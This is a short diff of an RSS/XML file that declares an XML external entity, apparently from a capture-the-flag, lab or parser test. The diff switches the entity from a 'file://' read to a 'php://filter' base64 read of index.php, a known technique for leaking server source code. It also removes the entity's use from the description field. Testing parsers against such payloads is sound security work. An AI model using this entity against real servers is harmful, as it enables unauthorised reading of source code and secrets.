@@ -1,13 +1,13 @@
 <?xml version="1.0" ?>
 <!DOCTYPE data [
     <!ELEMENT description (#ANY)>
-    <!ENTITY file SYSTEM "file://index.php">
+    <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=index.php">
 ]>
 <rss version="2.0">
 <channel>
   <title>Ajax et XML</title>
   <link>https://www.xul.fr/</link>
-  <description>&file;</description>
+  <description>L'interface graphique XML etc...</description>
   <image>
   <url>http:///www.xul.fr/xul-icon.gif</url>
   <link>http:///www.xul.fr/index.php</link>
